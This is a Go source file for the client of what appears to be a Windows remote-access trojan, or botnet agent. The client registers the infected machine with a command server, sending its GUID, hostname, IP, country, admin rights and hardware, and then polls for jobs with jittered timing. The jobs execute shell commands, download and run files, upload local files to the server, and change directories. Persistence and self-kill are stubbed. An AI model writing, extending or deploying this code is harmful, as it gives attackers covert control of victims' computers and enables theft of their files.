package main

import (
	"Worker/system/win"
	"Worker/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path"
	"strconv"
	"strings"
	"time"
)

type RequestType int

const (
	REGISTER_R RequestType = iota
	HARDWARE_R
	RETRIEVE_R
	REPORTS_R
	UPLOADS_R
)

type Worker struct {
	id        string
	isAdmin   bool
	boostMode bool // TODO: after new start we need to notify server about disabled boost!
}

type HostInfo struct {
	Id       string `json:"id"`
	Hostname string `json:"hostname"`
	Os       string `json:"os"`
	IpAddr   string `json:"ip_addr"`
	Country  string `json:"country"`
	Boost    bool   `json:"boost"`
	IsAdmin  bool   `json:"is_admin"`
}

type HardwareInfo struct {
	Gpu string `json:"gpu"`
	Cpu string `json:"cpu"`
	Ram string `json:"ram"`
}

// TODO: check for wrong input?
func buildRequestUrl(reqType RequestType, workerId, jobId string) string {
	baseUrl := SERVER_ADDR + "/api/workers/" + workerId
	switch reqType {
	case RETRIEVE_R:
		return baseUrl + "/jobs?undone"
	case REPORTS_R:
		return baseUrl + "/jobs/" + jobId + "/report"
	case UPLOADS_R:
		return baseUrl + "/uploads"
	case HARDWARE_R:
		return baseUrl + "/hardware"
	case REGISTER_R:
		return SERVER_ADDR + "/api/workers"
	}
	return ""
}

func NewWorker() *Worker {
	uuid, _ := win.GetMachineGuid()
	uuid, _ = utils.UuidStrToBase64Str(uuid)
	return &Worker{
		id:        uuid,
		isAdmin:   win.ProcessHasAdminRights(),
		boostMode: true, // TODO: remove later!
	}
}

// TODO: call this method only if worker not persisted!
func (w *Worker) register() bool {
	hostInfo := HostInfo{Id: w.id, IsAdmin: w.isAdmin, Boost: false}
	hostInfo.Hostname, _ = os.Hostname()
	hostInfo.Os, _ = win.GetOsName()
	hostInfo.IpAddr, hostInfo.Country = utils.GetMyIpCountry()

	reqBody, _ := json.Marshal(hostInfo)
	registerUrl := buildRequestUrl(REGISTER_R, w.id, "")

	for i := 1; i <= MAX_RETRIES; i++ {
		resp, err := http.Post(registerUrl, "application/json", bytes.NewBuffer(reqBody))
		if err == nil {
			resp.Body.Close()
			w.tellHardwareInfo()
			return true
		}
		time.Sleep(time.Minute * time.Duration(i))
	}
	return false
}

func (w *Worker) tellHardwareInfo() {
	hardwareInfo := HardwareInfo{}
	hardwareInfo.Gpu, _ = win.GetGpuName()
	hardwareInfo.Cpu, _ = win.GetCpuName()
	totalRam, _ := win.GetTotalRam()
	hardwareInfo.Ram = utils.ToReadableSize(totalRam)

	reqBody, _ := json.Marshal(hardwareInfo)
	hardwareInfoUrl := buildRequestUrl(HARDWARE_R, w.id, "")

	resp, err := http.Post(hardwareInfoUrl, "application/json", bytes.NewBuffer(reqBody))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) poll() {
	jobsUrl := buildRequestUrl(RETRIEVE_R, w.id, "")
	errorN := 0
	for {
		resp, err := http.Get(jobsUrl)
		if err != nil {
			errorN++
			if errorN == MAX_RETRIES {
				w.kill()
				return
			}
			time.Sleep(time.Minute * time.Duration(errorN))
			continue
		}
		errorN = 0
		var jobs []Job
		err = json.NewDecoder(resp.Body).Decode(&jobs)
		if err != nil {
			fmt.Println(err)
			goto end
		}
		// TODO: sort jobs by create time
		if len(jobs) > 1 {
			sortJobsByTime(jobs)
		}
		for _, j := range jobs {
			w.resolve(&j)
		}
	end:
		if w.boostMode {
			time.Sleep(time.Duration(MIN_DELAY) * time.Second)
		} else {
			time.Sleep(time.Duration(utils.RandomInt(MIN_DELAY, MAX_DELAY)) * time.Second)
		}
	}
}

func (w *Worker) resolve(job *Job) {
	todo, args := job.parse()
	fmt.Println(job.Todo)
	fmt.Println(job.Created)
	switch todo {
	case SHELL_CMD:
		output, _ := win.ExecuteCommand(args...) // TODO: check for errors and send error message as report
		w.report(job.Id, output)
	case BOOST:
		w.boostMode = args[0] == "on" // TODO: check inside parseJob whether args are correct
		w.report(job.Id, "Boost mode changed.")
	case SLEEP:
		val, err := strconv.Atoi(args[0])
		if err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
			time.Sleep(time.Duration(val) * time.Second)
		}
	case DOWNLOAD:
		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "File downloaded and executed.")
		}
	case UPLOAD:
		dest := buildRequestUrl(UPLOADS_R, w.id, "")
		loc, err := utils.UploadFile(args[0], dest)
		if err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
		}
	case CHDIR:
		if err := os.Chdir(args[0]); err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "Directory changed to "+args[0])
		}
	case UNKNOWN:
		w.report(job.Id, "Received job has wrong format.")
	}
}

func (w *Worker) report(jobId int, rep string) {
	reportUrl := buildRequestUrl(REPORTS_R, w.id, strconv.Itoa(jobId))
	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", strings.NewReader(rep))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) persist() {

}

func (w *Worker) kill() {

}

func (w *Worker) exists() {

}

func (w *Worker) run() {
	// if !w.persisted()
	// w.persist()
	if ok, _ := win.ProcessAlreadyRunning(); ok {
		return
	}
	if !w.register() {
		w.kill()
	} else {
		w.poll()
	}
}
